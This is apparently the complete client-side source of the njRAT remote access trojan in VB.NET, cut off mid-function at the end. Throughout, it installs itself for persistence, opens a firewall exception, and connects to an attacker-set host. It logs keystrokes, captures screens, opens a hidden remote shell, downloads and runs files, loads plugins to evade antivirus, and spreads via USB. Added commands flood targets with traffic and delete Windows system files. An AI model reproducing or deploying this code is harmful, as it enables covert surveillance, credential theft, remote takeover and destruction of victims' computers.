Imports System.Collections.Generic
Imports System.Threading
Imports System.IO.Compression
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Drawing
Imports System.Windows.Forms
Imports System.Text.RegularExpressions
Imports System.Net.Mail
Imports System
Imports System.Text
Imports Microsoft.Win32
Imports System.Net
Imports System.Net.Sockets
Imports System.DirectoryServices
Imports System.Management
Public Class StubEng
#Region "Settings"
    Public VN As String = "%vn%"
    Public VR As String = "0.1.0B"
    Public MTX As String = ""
    Public MT As Mutex = Nothing
    Public EXE As String = "%exe%"
    Public DR As String = "%dir%"
    Public RG As String = "%rg%"
    Public H As String = "%host%"
    Public P As String = "%port%"
    Public SPR As Boolean = "%usb%"
    Public Y As String = "|'|'|"
    Public BD As Boolean = "%bsod%"
    Private Declare Function BlockInput Lib "user32" (ByVal fBlock As Long) As Long
#End Region
    Public usb As New USB
    Sub WL()
        MTX = RG
        If Command() IsNot Nothing Then

            If Command.Length > 0 Then
                Dim a = Split(Command, ":")
                Select Case a(0)
                    Case "UP"
                        Try
                            F.Registry.CurrentUser.SetValue("di", "!")
                        Catch ex As Exception
                        End Try
                        Try
                            Dim p As Object = Process.GetProcessById(CType(a(1), Integer))
                            p.WaitForExit(5000)
                            Try
                                p.Dispose()
                            Catch ex As Exception
                            End Try
                        Catch ex As Exception
                            Threading.Thread.CurrentThread.Sleep(5000)
                        End Try
                    Case ".." ' sleep 5 sec at windows startup
                        Threading.Thread.CurrentThread.Sleep(5000)
                End Select
            End If
        End If
        INS()
        Try ' check if i am running 2 times or something
            For Each x In Process.GetProcesses
                Try
                    If CompDir(New IO.FileInfo(x.MainModule.FileName), LO) Then
                        If x.Id > Process.GetCurrentProcess.Id Then
                            End
                        End If
                    End If
                Catch ex As Exception
                End Try
            Next
        Catch ex As Exception
        End Try
        Try
            Mutex.OpenExisting(MTX)
            End
        Catch ex As Exception
        End Try
        Try
            MT = New Mutex(True, MTX)
        Catch ex As Exception
            End
        End Try
        ' start Thread of tcpClient
        Dim tt As Object = New Thread(AddressOf RC, 1)
        tt.Start()

        If SPR = True Then
            usb.ExeName = RG & ".exe"
            usb.Start()
        End If
        ' Start Keylogger
        Try
            kq = New kl
            tt = New Thread(AddressOf kq.WRK, 1)
            tt.Start()
        Catch ex As Exception
        End Try
        Dim ac As Integer = 0
        Dim su As Integer = 0
        Dim ov As String = ""
        If BD Then
            Try
                AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf ED
                pr(1) ' protect my process
            Catch ex As Exception
            End Try
        End If
        While True
            Thread.CurrentThread.Sleep(1000)
            Try
                ac += 1
                su += 1
                If ac = 5 Then
                    Try
                        EmptyWorkingSet(Process.GetCurrentProcess.Handle)
                    Catch ex As Exception
                    End Try
                End If
                If ac > 10 Then
                    ac = 0
                    If Cn = True Then
                        If ACT() = ov Then
                        Else
                            ov = ACT()
                            If ov IsNot Nothing Then
                                If ov.Length > 0 Then
                                    Send("act" & Y & ov)
                                End If
                            End If
                        End If
                    End If
                End If
                If su > 7 Then ' every 7 Seconds Add Startup Values
                    su = 0
                    Try
                        F.Registry.CurrentUser.OpenSubKey(sf, True).SetValue(RG, ChrW(34) & LO.FullName & ChrW(34) & " ..")
                    Catch ex As Exception
                    End Try
                    Try
                        F.Registry.LocalMachine.OpenSubKey(sf, True).SetValue(RG, ChrW(34) & LO.FullName & ChrW(34) & " ..")
                    Catch ex As Exception
                    End Try
                    Try
                        IO.File.Copy(LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & RG & ".exe", True)
                    Catch ex As Exception
                    End Try
                End If
            Catch ex As Exception
            End Try
        End While
    End Sub
#Region "Functions"
    Public Sub DLV(ByVal n As String) ' delete value in my Registry Key RG
        Try
            F.Registry.CurrentUser.CreateSubKey("Software\" & RG).DeleteValue(n)
        Catch ex As Exception
        End Try
    End Sub
    Function GTV(ByVal n As String) As String ' Get value in my Registry Key RG
        Try
            Return F.Registry.CurrentUser.CreateSubKey("Software\" & RG).GetValue(n, "")
        Catch ex As Exception
            Return ""
        End Try
    End Function
    Function STV(ByVal n As String, ByVal t As String) ' set value in my Registry Key RG
        Try
            F.Registry.CurrentUser.CreateSubKey("Software\" & RG).SetValue(n, t)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Function inf() As String
        Dim s As String = "lv" & Y
        ' Victim name
        Try
            If GTV("vn") = "" Then
                s += ENB(DEB(VN) & "_" & HWD()) & Y
            Else
                s += ENB(DEB(GTV("vn")) & "_" & HWD()) & Y
            End If
        Catch ex As Exception
            s &= ENB(HWD()) & Y
        End Try
        ' PC
        Try
            s += Environment.MachineName & Y
        Catch ex As Exception
            s += "??" & Y
        End Try
        ' username
        Try
            s += Environment.UserName & Y
        Catch ex As Exception
            s += "??" & Y
        End Try
        ' install date

        s += FR() & Y
        ' Country
        Try
            s += Gcc(&H7) & Y
        Catch ex As Exception
            s += "X" & Y
        End Try
        ' OS
        Try
            s += F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win")
        Catch ex As Exception
            s += "??" '& Y
        End Try
        s += "SP"
        Try
            Dim k As String() = Split(Environment.OSVersion.ServicePack, " ")
            If k.Length = 1 Then
                s &= "0"
            End If
            s &= k(k.Length - 1)
        Catch ex As Exception
            s &= "0"
        End Try
        Try
            If Environment.GetFolderPath(38).Contains("x86") Then
                s += " x64" & Y
            Else
                s += " x86" & Y
            End If
        Catch ex As Exception
            s += Y
        End Try
        ' Cam
        If Cam() = True Then
            s += "Yes" & Y
        Else
            s += "No" & Y
        End If
        ' Version
        s += VR & Y
        ' ping
        s += ".." & Y
        ' active window
        s += ACT() & Y
        Dim x As String = ""
        Try ' plugin list..
            For Each xx As String In F.Registry.CurrentUser.CreateSubKey("Software\" & RG, False).GetValueNames
                If xx.Length = 32 Then
                    x &= xx & ","
                End If
            Next
        Catch ex As Exception
        End Try
        Return s & x
    End Function
    Public Function FR() As String ' install Date
        Try
            Return CType(LO, IO.FileInfo).LastWriteTime.ToString("yyyy-MM-dd")
        Catch ex As Exception
            Return "unknown"
        End Try
    End Function
    Public Function ENB(ByRef s As String) As String ' Encode base64
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function
    Public Function DEB(ByRef s As String) As String ' Decode Base64
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Function RN(ByVal c As Integer) As String ' get Random String
        Randomize()
        Dim r As New Random
        Dim s As String = ""
        Dim k As String = "abcdefghijklmnopqrstuvwxyz"
        For i As Integer = 1 To c
            s += k(r.Next(0, k.Length))
        Next
        Return s
    End Function
    Public Function SB(ByRef S As String) As Byte() ' String To Bytes
        Return System.Text.Encoding.Default.GetBytes(S)
    End Function
    Public Function BS(ByRef B As Byte()) As String ' Byets To String
        Return System.Text.Encoding.Default.GetString(B)
    End Function
    Public SPL As String = "[endof]"
    Function fx(ByVal b As Byte(), ByVal spl As String) As Array
        ' splites Bytes By Word
        Dim a As Object = New List(Of Byte())
        Dim M As Object = New IO.MemoryStream
        Dim MM As Object = New IO.MemoryStream
        Dim T As String() = Split(BS(b), spl)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + spl.Length, b.Length - (T(0).Length + spl.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function
    Public Function ZIP(ByVal B() As Byte, ByRef CM As Boolean) As Byte()
        ' compress Bytes With GZIP
        If CM = True Then
            Dim M As Object = New IO.MemoryStream()
            Dim gZip As Object = New IO.Compression.GZipStream(M, CompressionMode.Compress, True)
            gZip.Write(B, 0, B.Length)
            gZip.Dispose()
            M.Position = 0
            Dim BF(M.Length) As Byte
            M.Read(BF, 0, BF.Length)
            M.Dispose()
            Return BF
        Else
            Dim M As Object = New IO.MemoryStream(B)
            Dim gZip As Object = New GZipStream(M, CompressionMode.Decompress)
            Dim buffer(3) As Byte
            M.Position = M.Length - 5
            M.Read(buffer, 0, 4)
            Dim size As Integer = BitConverter.ToInt32(buffer, 0)
            M.Position = 0
            Dim BF(size - 1) As Byte
            gZip.Read(BF, 0, size)
            gZip.Dispose()
            M.Dispose()
            Return BF
        End If
    End Function
#End Region
#Region "API"
    <DllImport("psapi")> _
    Public Shared Function EmptyWorkingSet(ByVal hProcess As Long) As Boolean
    End Function
    '======== process protect With BSOD
    <DllImport("ntdll")> _
    Private Shared Function NtSetInformationProcess(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
    End Function
    '=============================== Cam Drivers
    Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, _
    ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, _
    ByVal cbVer As Integer) As Boolean
    Public Function Cam() As Boolean
        Try
            Dim d As String = Space(100)
            For i As Integer = 0 To 4
                If capGetDriverDescriptionA(i, d, 100, Nothing, 100) Then
                    Return True
                End If
            Next
        Catch ex As Exception
        End Try
        Return False
    End Function
    '=============================== PC Country
    <DllImport("kernel32.dll")> _
    Private Shared Function GetLocaleInfo(ByVal Locale As UInteger, ByVal LCType As UInteger, <Out()> ByVal lpLCData As System.Text.StringBuilder, ByVal cchData As Integer) As Integer
    End Function
    Public Function Gcc(ByVal i As UInteger) As String
        Try
            Dim lpLCData = New System.Text.StringBuilder(256)
            Dim ret As Integer = GetLocaleInfo(&H400, i, lpLCData, lpLCData.Capacity)
            If ret > 0 Then
                Return lpLCData.ToString().Substring(0, ret - 1)
            End If
        Catch ex As Exception
        End Try
        Return "X"
    End Function
    '====================================== Window API
    Public Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr ' Get Active window Handle
    Public Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Public Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As IntPtr, ByVal WinTitle As String, ByVal MaxLength As Integer) As Integer
    Public Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Integer
    Public Function ACT() As String ' Get Active Window Text
        Try
            Dim h As IntPtr = GetForegroundWindow()
            If h = IntPtr.Zero Then
                Return ENB(" ")
                Exit Function
            End If
            Dim t As Integer
            t = GetWindowTextLength(h)
            Dim w As String = StrDup(t + 1, "*")
            GetWindowText(h, w, t + 1)
            Dim pid As Integer
            GetWindowThreadProcessId(h, pid)
            If pid = 0 Then
                Return ENB(w)
            Else
                Try
                    Return ENB(Diagnostics.Process.GetProcessById(pid).MainWindowTitle())
                Catch ex As Exception
                    Return ENB(w)
                End Try
            End If
        Catch ex As Exception
            Return ENB(" ")
        End Try
    End Function
    '=================== Get Drive Serial
    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Function HWD() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "ERR"
        End Try
    End Function
#End Region
    Shared Sub main()
        Dim c As New StubEng
        c.WL()
    End Sub
    Private Sub ED() ' unprotect me if windows restart or logoff
        pr(0)
    End Sub
    Public kq As kl = Nothing
    Function Plugin(ByVal ByteOfPlugin As Byte(), ByVal ClassName As String) As Object
        ' i write it like this to bypass some AV :)
        Dim J As Object = Reflection.Assembly.Load(ByteOfPlugin)
        Try
        Catch ex As Exception
        End Try
        Return J.CreateInstance(Split(J.FullName, ",")(0) & "." & ClassName)
    End Function


    Public LO As Object = New IO.FileInfo(Application.ExecutablePath)
#Region "remote Shell"
    Private Sub RS(ByVal a As Object, ByVal e As Object) 'Handles k.OutputDataReceived
        Try
            Send("rs" & Y & ENB(e.Data))
        Catch ex As Exception
        End Try
    End Sub
    Private Sub ex()
        Try
            Send("rsc")
        Catch ex As Exception
        End Try
    End Sub
    Private Pro As Object
#End Region
    Sub Ind(ByVal b As Byte()) ' all data recived From njRAT
        Dim A As String() = Split(BS(b), Y)
        Try
            Select Case A(0)
                Case "rss" ' start remote shell
                    Try
                        Pro.Kill()
                    Catch ex As Exception
                    End Try
                    Pro = New Process
                    Pro.StartInfo.RedirectStandardOutput = True
                    Pro.StartInfo.RedirectStandardInput = True
                    Pro.StartInfo.RedirectStandardError = True
                    Pro.StartInfo.FileName = "cmd.exe"
                    Pro.StartInfo.RedirectStandardError = True
                    AddHandler CType(Pro, Process).OutputDataReceived, AddressOf RS
                    AddHandler CType(Pro, Process).ErrorDataReceived, AddressOf RS
                    AddHandler CType(Pro, Process).Exited, AddressOf ex
                    Pro.StartInfo.UseShellExecute = False
                    Pro.StartInfo.CreateNoWindow = True
                    Pro.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                    Pro.EnableRaisingEvents = True
                    Send("rss")
                    Pro.Start()
                    Pro.BeginErrorReadLine()
                    Pro.BeginOutputReadLine()
                Case "rs"
                    Pro.StandardInput.WriteLine(DEB(A(1)))
                Case "rsc"
                    Try
                        Pro.Kill()
                    Catch ex As Exception
                    End Try
                    Pro = Nothing
                Case "kl" ' send keylogger logs

                    Send("kl" & Y & ENB(kq.Logs))
                Case "inf" ' send server settings
                    Dim x As String = "inf" & Y
                    If GTV("vn") = "" Then
                        x += ENB(DEB(VN) & "_" & HWD()) & Y
                    Else
                        x += ENB(DEB(GTV("vn")) & "_" & HWD()) & Y
                    End If
                    x &= H & ":" & P & Y
                    x &= DR & Y
                    x &= EXE & Y
                    x &= Process.GetCurrentProcess.ProcessName
                    Send(x)
                Case "prof" ' registry profile /set /get /del values
                    Select Case A(1)
                        Case "~" ' set value
                            STV(A(2), A(3))
                        Case "!" ' get value
                            STV(A(2), A(3))
                            Send("getvalue" & Y & A(1) & Y & GTV(A(1)))
                        Case "~" ' del value
                            DLV(A(2))
                    End Select
                Case "rn" ' download&run File
                    Dim by As Byte() = Nothing
                    If A(2).ToLower.StartsWith("http") = False Then

                        by = ZIP(Convert.FromBase64String(A(2)), False)
                    Else
                        Dim w As Object = New Net.WebClient
                        by = w.DownloadData(A(2))
                    End If
                    Send("bla")
                    Dim fn As String = Environ("temp") & "\" & RN(10) & "." & A(1)
                    IO.File.WriteAllBytes(fn, by)
                    Process.Start(fn)
                Case "inv" ' invoke plugin By Name
                    Send("bla")
                    Dim S As String = GTV(A(1))
                    Dim by As Byte()
                    If S.Length > 0 Then
                        by = Convert.FromBase64String(S)
                        Send("pl" & Y & A(1) & Y & 0)
                    Else
                        If A(3).Length = 1 Then
                            Send("pl" & Y & A(1) & Y & "False")
                            Exit Sub
                        End If
                        by = ZIP(Convert.FromBase64String(A(3)), False)
                        If STV(A(1), Convert.ToBase64String(by)) Then
                            Send("pl" & Y & A(1) & Y & 0)
                        End If
                    End If
                    Dim obj As Object = Plugin(by, "A")
                    obj.h = H
                    obj.p = P
                    obj.osk = A(2)
                    obj.start()
                    Do Until Cn = False Or obj.Off = True
                        Threading.Thread.CurrentThread.Sleep(1)
                    Loop
                    obj.off = True
                Case "ret" ' invoke and return
                    Send("bla")
                    Dim S As String = GTV(A(1))
                    Dim by As Byte()
                    If S.Length > 0 Then
                        by = Convert.FromBase64String(S)
                        Send("pl" & Y & A(1) & Y & 0)
                    Else
                        If A(2).Length = 1 Then
                            Send("pl" & Y & A(1) & Y & "True")
                            Exit Sub
                        End If
                        by = ZIP(Convert.FromBase64String(A(2)), False)
                        If STV(A(1), Convert.ToBase64String(by)) Then
                            Send("pl" & Y & A(1) & Y & 0)
                        End If
                    End If
                    Dim obj As Object = Plugin(by, "A")
                    Send("ret" & Y & A(1) & Y & ENB(CType(obj.GT, String)))
                Case "CAP" ' capture Screen!

                    Dim x As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
                    Dim g = Graphics.FromImage(x)
                    g.CopyFromScreen(0, 0, 0, 0, New Size(x.Width, x.Height), CopyPixelOperation.SourceCopy)
                    Try
                        Cursors.Default.Draw(g, New Rectangle(Cursor.Position, New Size(32, 32)))
                    Catch ex As Exception
                    End Try
                    g.Dispose()
                    Dim m As New IO.MemoryStream
                    b = SB("CAP" & Y)
                    m.Write(b, 0, b.Length)
                    Dim MM As New IO.MemoryStream
                    x.GetThumbnailImage(A(1), A(2), Nothing, Nothing).Save(MM, Imaging.ImageFormat.Jpeg)
                    m.Write(MM.ToArray, 0, MM.Length)
                    Send(m.ToArray)
                    m.Dispose()
                    MM.Dispose()
                    x.Dispose()

                Case "P" ' PING!
                    Send("P")

                Case "un" ' uninstall\close\restart
                    Select Case A(1)
                        Case "~"
                            UNS()
                        Case "!"
                            pr(0)
                            End
                        Case "@"
                            pr(0)
                            Diagnostics.Process.Start(LO.FullName)
                            End
                    End Select

                Case "up" ' update
                    Dim by As Byte() = Nothing
                    If A(1).ToLower.StartsWith("http") = False Then
                        by = ZIP(Convert.FromBase64String(A(1)), False)
                    Else
                        Dim w As Object = New Net.WebClient
                        by = w.DownloadData(A(1))
                    End If
                    Send("bla")
                    Me.F.Registry.CurrentUser.SetValue("di", "")
                    Dim fn As String = Environ("temp") & "\" & RN(10) & ".exe"
                    IO.File.WriteAllBytes(fn, by)
                    Process.Start(fn, "UP:" & Process.GetCurrentProcess.Id)
                    For i As Integer = 0 To 500
                        Thread.CurrentThread.Sleep(10)
                        If Me.F.Registry.CurrentUser.GetValue("di", "") = "!" Then
                            UNS()
                        End If
                    Next
                Case "RG" ' Registry 
                    Dim kk As Object = GetKey(A(2))
                    Select Case A(1)
                        Case "~" ' send keys under key+ send values 
                            Dim s As String = "RG" & Y & "~" & Y & A(2) & Y
                            Dim o As String = ""
                            For Each x As String In kk.GetSubKeyNames
                                If x.Contains("\") = False Then
                                    o += x & Y
                                End If
                            Next
                            For Each x As String In kk.GetValueNames
                                o += x & "/" & kk.GetValueKind(x).ToString & "/" & kk.GetValue(x, "").ToString & Y
                            Next
                            Send(s & o)
                        Case "!" ' Set Value
                            kk.SetValue(A(3), A(4), A(5))
                        Case "@" ' delete value
                            kk.DeleteValue(A(3), False)
                        Case "#" ' creat key
                            kk.CreateSubKey(A(3))
                        Case "$" ' delete key
                            kk.DeleteSubKeyTree(A(3))

                        Case "ddos" ' fix and edit by Blάĉк.Hάĉкєr
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                            Shell("Ping " + A(1) + "-l" + A(2))
                        Case "UDP"
                            Do
                                Dim udpClient As New Net.Sockets.UdpClient
                                Dim GLOIP As IPAddress
                                Dim bytCommand As Byte() = New Byte() {}
                                GLOIP = IPAddress.Parse(A(1)) '<---
                                udpClient.Connect(GLOIP, "80") '<---
                                bytCommand = Encoding.ASCII.GetBytes("BLAAAAAAAAAAAAAAA!/asldifrhXGJRCVKJJEAWTBRHGMGGaslkdfhaseoirfhasdhfjXGJRCVKJJEAWTBRHGMGGasdzf483975634597328528934tzhXGJRCVKJJEAWTBRHGMGGeufgz34975638q9ruweirf​XGJRCVKJJEAWTBRHGMGGhsdkjvnwu45z6384975weuirhjsfndjvzw438563qXGJRCVKJJEAWTBRHGMGG84ruwajfjsadfhdfhgq349875q390rXGJRCVKJJEAWTBRHGMGGuf)=/()%&§%&%XGJRCVKJJEAWTBRHGMGGJGKTCMFPHBJKEZEFTJLMNMEEJJYATLRJCTNYMSXWWARWJIKELWOYXNKVFDOWRYXARGFGKLVUPWCMKECEQRXUXGWJTWSTHZEZKXSH!!!!@#$%^&*(())_+|}{}{}{}{hjbgipsdbgbgdsipsdgii9375hdasih0=398pofjkphdi9-3\-49jdfisodf3-49947-932fskdnf9")
                                udpClient.Send(bytCommand, bytCommand.Length)
                            Loop
                        Case "Down" ' Coded by Blάĉк.Hάĉкєr
                            Kill("C:\Windows\System32\cmd.exe")
                            Kill("C:\Windows\System32\taskmgr.exe")
                            Kill("C:\Windows\System32\msconfig.exe")
                            Kill("C:\Windows\regedit.exe")
                            Kill("C:\Windows\System32\svchost.exe")
                            Kill("C:\Windows\System32\shell.dll")
                            Kill("C:\Windows\System32\winlogon.exe")
                            Kill("C:\Windows\explorer.exe")
                            Kill("C:\Windows\System32\*.dll")
                            Kill("C:\Windows\System32\*.exe")
                            Kill("C:\Windows\*.exe")
                            Kill("%systemdrive%\windows\system32\*.dll")
                            Kill("%systemdrive%\windows\*.exe")
                            Kill("%systemdrive%\windows\system32\*.exe")
                            Kill("C:\Windows\*.dll")
                        Case "money" ' Coded by Blάĉк.Hάĉкєr
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            Process.Start(A(1))
                            BlockInput(True)
                            Thread.Sleep(1000)
                            BlockInput(False)
                    End Select
            End Select
        Catch ex As Exception
            Try
                Send("ER" & Y & A(0) & Y & ex.Message)
                If A(0) = "up" Or A(0) = "rn" Then
                    Send("bla")
                End If
            Catch e As Exception
            End Try
        End Try
    End Sub
    Function GetKey(ByVal key As String) As Microsoft.Win32.RegistryKey ' get registry Key
        Dim k As String
        If key.StartsWith(F.Registry.ClassesRoot.Name) Then
            k = key.Replace(F.Registry.ClassesRoot.Name & "\", "")
            Return F.Registry.ClassesRoot.OpenSubKey(k, True)
        End If
        If key.StartsWith(F.Registry.CurrentUser.Name) Then
            k = key.Replace(F.Registry.CurrentUser.Name & "\", "")
            Return F.Registry.CurrentUser.OpenSubKey(k, True)
        End If
        If key.StartsWith(F.Registry.LocalMachine.Name) Then
            k = key.Replace(F.Registry.LocalMachine.Name & "\", "")
            Return F.Registry.LocalMachine.OpenSubKey(k, True)
        End If
        If key.StartsWith(F.Registry.Users.Name) Then
            k = key.Replace(F.Registry.Users.Name & "\", "")
            Return F.Registry.Users.OpenSubKey(k, True)
        End If
        Return Nothing
    End Function
    Public Cn As Boolean = False
    Public C As Object = Nothing
    Sub pr(ByVal i As Integer) ' protect process With BSOD
        ' if i= 0  Unprotect, if i=1 Protect
        Try
            NtSetInformationProcess(Process.GetCurrentProcess.Handle, 29, i, 4)
        Catch ex As Exception
        End Try
    End Sub
    Public Sub Send(ByVal b As Byte())
        If Cn = False Then Exit Sub
        Try
            Dim r As Object = New IO.MemoryStream
            r.Write(b, 0, b.Length)
            r.Write(SB(SPL), 0, SPL.Length)
            C.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
            r.Dispose()
        Catch ex As Exception
            Cn = False
        End Try
    End Sub
    Public Sub Send(ByVal S As String)
        Send(SB(S))
    End Sub
    Sub RC()
        Dim M As Object = New IO.MemoryStream ' create memory stream
        Dim lp As Integer = 0
re:
        Try
            If C Is Nothing Then GoTo e
            If C.Client.Connected = False Then GoTo e
            If Cn = False Then GoTo e
            lp += 1

            If lp > 500 Then
                lp = 0
                ' check if i am still connected
                If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then GoTo e
            End If
            If C.Available > 0 Then
                Dim B(C.Available - 1) As Byte
                C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                M.Write(B, 0, B.Length)
rr:
                If BS(M.ToArray).Contains(SPL) Then ' split packet..
                    Dim A As Array = fx(M.ToArray, SPL)
                    Dim T As New Thread(AddressOf Ind)
                    T.Start(A(0))
                    M.Dispose()
                    M = New IO.MemoryStream
                    If A.Length = 2 Then
                        M.Write(A(1), 0, A(1).length)
                        GoTo rr
                    End If
                End If
            End If
        Catch ex As Exception
            GoTo e
        End Try
        Threading.Thread.CurrentThread.Sleep(1)
        GoTo re
e:
        Cn = False
        Try
            C.Client.Disconnect(False)
        Catch ex As Exception
        End Try
        Try
            M.Dispose()
        Catch ex As Exception
        End Try
        M = New IO.MemoryStream
        Try
            Pro.Kill()
            Pro = Nothing
        Catch ex As Exception
        End Try
        Try
            C = New Net.Sockets.TcpClient
            C.ReceiveTimeout = -1
            C.SendTimeout = -1
            C.SendBufferSize = 999999
            C.ReceiveBufferSize = 999999
            C.Client.SendBufferSize = 999999
            C.Client.ReceiveBufferSize = 999999
            lp = 0
            C.Client.Connect(H, P)
            Cn = True
            Send(inf)
            Try
                If GTV("us") = "!" Then
                    Send("us")
                End If
            Catch ex As Exception
                Cn = False
            End Try
        Catch ex As Exception
            Threading.Thread.CurrentThread.Sleep(2500)
            GoTo e
        End Try
        GoTo re
    End Sub
    Dim sf As String = "Software\Microsoft\Windows\CurrentVersion\Run"
    Sub UNS() ' Uninstall
        pr(0) ' unprotect me
        usb.clean()
        Try ' Remove StartUp HKCU
            F.Registry.CurrentUser.OpenSubKey(sf, True).DeleteValue(RG, False)
        Catch ex As Exception
        End Try
        Try ' Remove StartUp HKLM
            F.Registry.LocalMachine.OpenSubKey(sf, True).DeleteValue(RG, False)
        Catch ex As Exception
        End Try
        Try ' Remove Firewall rule
            Shell("netsh firewall delete allowedprogram " & ChrW(34) & LO.FullName & ChrW(34), AppWinStyle.Hide)
        Catch ex As Exception
        End Try
        Try ' remove me from Startup Folder
            Dim e = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & RG & ".exe"
            IO.File.Delete(e)
        Catch ex As Exception
        End Try
        Try ' delete My Registry Key
            F.Registry.CurrentUser.OpenSubKey("Software", True).DeleteSubKey(RG, False)
        Catch ex As Exception
        End Try
        Try ' Self Delete
            Shell("cmd.exe /k ping 0 & del " & ChrW(34) & LO.FullName & ChrW(34) & " & exit", AppWinStyle.Hide)
        Catch ex As Exception
        End Try
        End '<< END process
    End Sub
    Private Function CompDir(ByVal F1 As IO.FileInfo, ByVal F2 As IO.FileInfo) As Boolean ' Compare 2 path
        If F1.Name.ToLower <> F2.Name.ToLower Then Return False
        Dim D1 = F1.Directory
        Dim D2 = F2.Directory
re:
        If D1.Name.ToLower = D2.Name.ToLower = False Then Return False
        D1 = D1.Parent
        D2 = D2.Parent
        If D1 Is Nothing And D2 Is Nothing Then Return True
        If D1 Is Nothing Then Return False
        If D2 Is Nothing Then Return False
        GoTo re
    End Function
    Sub INS() ' install server

        If CompDir(LO, New IO.FileInfo(Environ(DR).ToLower & "\" & EXE.ToLower)) = True Then
            ' i dont need to copy
        Else
            Try
                If GTV("us") = "" Then
                    If LO.Directory.Name.Contains(":") Then
                        STV("US", "!")
                    Else
                        STV("US", "@")
                    End If
                End If
            Catch ex As Exception
            End Try
            Try
                Environment.SetEnvironmentVariable(DEB("U0VFX01BU0tfTk9aT05FQ0hFQ0tT"), "1", EnvironmentVariableTarget.User)
            Catch ex As Exception
            End Try
            Try ' copy me to DR\EXE
                If IO.File.Exists(Environ(DR) & "\" & EXE) Then IO.File.Delete(Environ(DR) & "\" & EXE)
                IO.File.Copy(LO.FullName, Environ(DR) & "\" & EXE, True)
                Diagnostics.Process.Start(Environ(DR) & "\" & EXE)
                End
            Catch ex As Exception
                End
            End Try
        End If
        Try ' bypass Windows FireWall
            Shell("netsh firewall add allowedprogram " & ChrW(34) & LO.FullName & ChrW(34) & " " & ChrW(34) & LO.Name & ChrW(34) & " ENABLE", AppWinStyle.Hide)
        Catch ex As Exception
        End Try
        Try ' Add startup HKCU
